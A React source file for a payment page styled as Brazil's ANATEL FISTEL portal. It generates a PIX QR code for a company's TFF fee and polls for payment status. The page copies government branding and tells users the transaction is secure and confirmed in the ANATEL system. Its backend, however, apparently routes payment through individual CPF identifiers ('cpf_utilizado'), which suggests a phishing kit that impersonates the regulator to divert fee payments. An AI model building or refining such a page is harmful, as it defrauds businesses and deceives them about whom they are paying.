import React, { useState, useEffect, useRef } from 'react';
import { useNavigate, useLocation } from 'react-router-dom';
import axios from 'axios';
import { QRCode } from 'react-qrcode-logo';
import AnatelHeader from '@/components/AnatelHeader';
import AnatelFooter from '@/components/AnatelFooter';
import { Copy, CheckCircle2, Clock, Shield, AlertCircle } from 'lucide-react';
import { toast } from 'sonner';

const BACKEND_URL = process.env.REACT_APP_BACKEND_URL;
const API = `${BACKEND_URL}/api`;

const AnatelPagamentoPage = () => {
  const navigate = useNavigate();
  const location = useLocation();
  const [dadosEmpresa, setDadosEmpresa] = useState(null);
  const [taxas, setTaxas] = useState(null);
  const [pagamento, setPagamento] = useState(null);
  const [loading, setLoading] = useState(false);
  const [copiado, setCopiado] = useState(false);
  const pixGeradoRef = useRef(false);
  
  // Capturar o estado antes que o useEffect rode — evita perda em StrictMode
  const stateRef = useRef(location.state);

  useEffect(() => {
    if (pixGeradoRef.current) return;
    pixGeradoRef.current = true;

    const state = stateRef.current;
    const dados = state?.dadosEmpresa;
    const taxasData = state?.taxas;

    if (!dados || !taxasData) {
      toast.error('Dados não encontrados');
      navigate('/anatel');
      return;
    }

    setDadosEmpresa(dados);
    setTaxas(taxasData);

    const cpfAnterior = state?.cpfAnterior;
    gerarPix(dados, taxasData, cpfAnterior);
  }, []);

  const gerarPix = async (empresa, taxasData, cpfAnterior = null) => {
    setLoading(true);
    try {
      let response;
      if (cpfAnterior) {
        response = await axios.post(`${API}/pagamento/pix-2026`, {
          cnpj: empresa.cnpj,
          nome: empresa.nome,
          email: 'contato@empresa.com',
          valor: taxasData.total,
          cpf_anterior: cpfAnterior
        });
      } else {
        response = await axios.post(`${API}/pagamento/pix`, {
          cnpj: empresa.cnpj,
          nome: empresa.nome,
          email: 'contato@empresa.com',
          valor: taxasData.total
        });
      }
      setPagamento(response.data);
      toast.success('QR Code gerado com sucesso!');
      iniciarMonitoramento(response.data.id, response.data.cpf_utilizado);
    } catch (error) {
      console.error('Erro ao gerar PIX:', error);
      toast.error('Erro ao gerar PIX. Tente novamente.');
    } finally {
      setLoading(false);
    }
  };

  const simularAprovacao = async () => {
    if (!pagamento?.id) return;
    try {
      await axios.post(`${API}/pagamento/simular-aprovacao/${pagamento.id}`);
      toast.success('Pagamento aprovado com sucesso!');
      
      const isExercicio2026 = stateRef.current?.exercicio2026;
      
      setTimeout(() => {
        if (isExercicio2026) {
          navigate('/anatel/em-dia', {
            state: {
              cnpj: dadosEmpresa?.cnpj,
              dadosEmpresa,
              replace: true
            }
          });
        } else {
          navigate('/anatel/confirmacao', {
            state: {
              valor: taxas?.total,
              cnpj: dadosEmpresa?.cnpj,
              dadosEmpresa,
              cpfUtilizado: pagamento?.cpf_utilizado
            }
          });
        }
      }, 800);
    } catch (error) {
      console.error('Erro:', error);
      toast.error('Erro ao processar simulação');
    }
  };

  const iniciarMonitoramento = (transactionId, cpfUtilizado) => {
    const isExercicio2026 = stateRef.current?.exercicio2026;

    const interval = setInterval(async () => {
      try {
        const response = await axios.get(`${API}/pagamento/status/${transactionId}`);
        const status = response.data.status;
        if (status === 'paid' || status === 'approved' || status === 'CONFIRMED') {
          clearInterval(interval);
          toast.success('Pagamento confirmado!');
          setTimeout(() => {
            if (isExercicio2026) {
              navigate('/anatel/em-dia', {
                state: { cnpj: dadosEmpresa?.cnpj, dadosEmpresa }
              });
            } else {
              navigate('/anatel/confirmacao', {
                state: {
                  valor: taxas?.total,
                  cnpj: dadosEmpresa?.cnpj,
                  dadosEmpresa,
                  cpfUtilizado
                }
              });
            }
          }, 1500);
        }
      } catch (error) {
        console.error('Erro ao verificar status:', error);
      }
    }, 10000);

    setTimeout(() => clearInterval(interval), 30 * 60 * 1000);
  };

  const copiarCodigo = () => {
    if (pagamento?.qr_code) {
      navigator.clipboard.writeText(pagamento.qr_code);
      setCopiado(true);
      toast.success('Código PIX copiado!');
      setTimeout(() => setCopiado(false), 3000);
    }
  };

  const formatarValor = (v) =>
    new Intl.NumberFormat('pt-BR', { style: 'currency', currency: 'BRL' }).format(v || 0);

  const isExercicio2026 = stateRef.current?.exercicio2026;

  return (
    <div className="min-h-screen flex flex-col bg-[#F8F8F8]" style={{ fontFamily: "'Rawline', 'Segoe UI', system-ui, sans-serif" }}>
      <AnatelHeader breadcrumb={`Pagamento PIX — TFF ${isExercicio2026 ? '2026' : '2025'}`} />

      {/* Banner */}
      <div style={{ backgroundColor: '#1351B4' }} className="w-full py-6 px-4">
        <div className="max-w-[1200px] mx-auto">
          <p className="text-[#FFCD07] text-xs font-bold uppercase tracking-widest mb-1">FISTEL Online</p>
          <h1 className="text-white text-xl sm:text-2xl font-bold">
            Pagamento PIX — TFF {isExercicio2026 ? '2026' : '2025'}
          </h1>
        </div>
      </div>

      <main className="flex-1 py-8">
        <div className="max-w-[1200px] mx-auto px-4 sm:px-6">
          <div className="grid lg:grid-cols-3 gap-6">

            {/* QR Code principal */}
            <div className="lg:col-span-2">
              <div className="bg-white border border-gray-200 rounded shadow-sm overflow-hidden">
                <div className="border-b border-gray-200 px-5 py-4 flex items-center justify-between">
                  <h2 className="text-[#071D41] font-bold text-base">QR Code para Pagamento PIX</h2>
                  {dadosEmpresa && (
                    <span className="text-xs text-gray-500 font-medium">
                      {dadosEmpresa.nome?.substring(0, 30)}{dadosEmpresa.nome?.length > 30 ? '...' : ''}
                    </span>
                  )}
                </div>

                <div className="p-6">
                  {/* Valor */}
                  <div className="bg-[#F0F5FF] border border-[#1351B4]/20 rounded p-5 mb-6 text-center">
                    <p className="text-xs text-gray-500 uppercase tracking-wider mb-1 font-medium">Valor a Pagar</p>
                    <p className="text-4xl font-extrabold text-[#071D41]" data-testid="valor-pagamento">
                      {formatarValor(taxas?.total)}
                    </p>
                    <p className="text-xs text-[#1351B4] mt-1">Taxa de Fiscalização de Funcionamento — {isExercicio2026 ? 'Exercício 2026' : 'Exercício 2025'}</p>
                  </div>

                  {/* QR Code */}
                  {loading ? (
                    <div className="flex flex-col items-center py-12">
                      <div className="w-10 h-10 border-2 border-[#1351B4]/30 border-t-[#1351B4] rounded-full animate-spin mb-4" />
                      <p className="text-gray-500 text-sm">Gerando QR Code PIX...</p>
                      <p className="text-xs text-gray-400 mt-1">Aguarde um momento</p>
                    </div>
                  ) : pagamento?.qr_code ? (
                    <div className="flex flex-col items-center">
                      {/* QR Code box */}
                      <div className="bg-white p-4 border-2 border-gray-200 rounded-xl shadow-inner mb-5">
                        <QRCode
                          value={pagamento.qr_code}
                          size={200}
                          quietZone={12}
                          bgColor="#FFFFFF"
                          fgColor="#071D41"
                        />
                      </div>

                      {/* Instruções */}
                      <div className="w-full bg-[#F8F8F8] border border-gray-200 rounded p-4 mb-4">
                        <p className="text-xs font-bold text-[#071D41] mb-2 uppercase tracking-wide">Como pagar:</p>
                        <ol className="space-y-1.5">
                          {[
                            'Abra o app do seu banco',
                            'Acesse a função PIX → Ler QR Code',
                            'Aponte a câmera para o código acima',
                            'Confirme o pagamento'
                          ].map((step, i) => (
                            <li key={i} className="flex items-start gap-2 text-xs text-gray-600">
                              <span className="w-4 h-4 bg-[#1351B4] text-white rounded-full flex items-center justify-center text-[10px] font-bold flex-shrink-0 mt-0.5">
                                {i + 1}
                              </span>
                              {step}
                            </li>
                          ))}
                        </ol>
                      </div>

                      {/* Copiar código */}
                      <button
                        data-testid="btn-copiar-pix"
                        onClick={copiarCodigo}
                        className="w-full flex items-center justify-center gap-2 border-2 border-[#1351B4] text-[#1351B4] hover:bg-[#1351B4] hover:text-white font-bold text-sm py-3 rounded transition-colors cursor-pointer mb-4"
                      >
                        {copiado ? (
                          <><CheckCircle2 className="w-4 h-4" /> Código copiado!</>
                        ) : (
                          <><Copy className="w-4 h-4" /> Copiar código PIX (Copia e Cola)</>
                        )}
                      </button>

                      {/* Status */}
                      <div className="w-full flex items-center gap-3 bg-[#FFF8E1] border border-[#FFCD07] rounded p-3">
                        <Clock className="w-4 h-4 text-[#856404] flex-shrink-0" />
                        <div>
                          <p className="text-xs font-bold text-[#856404]">Aguardando confirmação de pagamento</p>
                          <p className="text-[10px] text-[#856404] mt-0.5">A aprovação pode levar alguns minutos</p>
                        </div>
                      </div>
                    </div>
                  ) : (
                    <div className="flex flex-col items-center py-10 text-center">
                      <AlertCircle className="w-10 h-10 text-red-400 mb-3" />
                      <p className="text-gray-600 text-sm font-medium">Erro ao gerar QR Code</p>
                      <p className="text-xs text-gray-400 mt-1">Tente recarregar a página</p>
                    </div>
                  )}
                </div>
              </div>

              {/* Botão de Simulação — REMOVER EM PRODUÇÃO */}
              {pagamento && (
                <div className="mt-4 border-2 border-orange-300 rounded overflow-hidden">
                  <div className="bg-orange-50 border-b border-orange-200 px-4 py-2">
                    <p className="text-orange-700 text-xs font-bold uppercase tracking-wide">Ambiente de Testes — Remover em Produção</p>
                  </div>
                  <div className="p-4">
                    <button
                      data-testid="btn-simular-aprovacao"
                      onClick={simularAprovacao}
                      className="w-full flex items-center justify-center gap-2 bg-orange-500 hover:bg-orange-600 text-white font-bold text-sm py-3 rounded transition-colors cursor-pointer"
                    >
                      Simular Aprovação de Pagamento
                    </button>
                  </div>
                </div>
              )}
            </div>

            {/* Sidebar */}
            <div className="space-y-4">
              <div className="bg-white border border-gray-200 rounded shadow-sm overflow-hidden">
                <div className="border-b border-gray-200 px-5 py-3 flex items-center gap-2">
                  <Shield className="w-4 h-4 text-[#168821]" />
                  <h3 className="text-[#071D41] font-bold text-sm">Pagamento Seguro</h3>
                </div>
                <div className="p-5 space-y-3 text-xs text-gray-600">
                  <p className="flex items-start gap-2">
                    <CheckCircle2 className="w-3.5 h-3.5 text-[#168821] mt-0.5 flex-shrink-0" />
                    Transação criptografada via PIX Bacen
                  </p>
                  <p className="flex items-start gap-2">
                    <CheckCircle2 className="w-3.5 h-3.5 text-[#168821] mt-0.5 flex-shrink-0" />
                    Confirmação em até 2h úteis no sistema ANATEL
                  </p>
                  <p className="flex items-start gap-2">
                    <CheckCircle2 className="w-3.5 h-3.5 text-[#168821] mt-0.5 flex-shrink-0" />
                    Comprovante emitido automaticamente
                  </p>
                </div>
              </div>

              {dadosEmpresa && (
                <div className="bg-white border border-gray-200 rounded shadow-sm overflow-hidden">
                  <div className="border-b border-gray-200 px-5 py-3">
                    <h3 className="text-[#071D41] font-bold text-sm">Resumo</h3>
                  </div>
                  <div className="p-5 space-y-3">
                    <div>
                      <p className="text-xs text-gray-500 uppercase tracking-wide mb-0.5">Empresa</p>
                      <p className="text-xs font-bold text-[#071D41] uppercase">{dadosEmpresa.nome}</p>
                    </div>
                    <div>
                      <p className="text-xs text-gray-500 uppercase tracking-wide mb-0.5">Taxa</p>
                      <p className="text-xs font-bold text-[#071D41]">TFF {isExercicio2026 ? '2026' : '2025'}</p>
                    </div>
                    <div>
                      <p className="text-xs text-gray-500 uppercase tracking-wide mb-0.5">Valor</p>
                      <p className="text-sm font-extrabold text-[#1351B4]">{formatarValor(taxas?.total)}</p>
                    </div>
                  </div>
                </div>
              )}
            </div>
          </div>
        </div>
      </main>

      <AnatelFooter />
    </div>
  );
};

export default AnatelPagamentoPage;
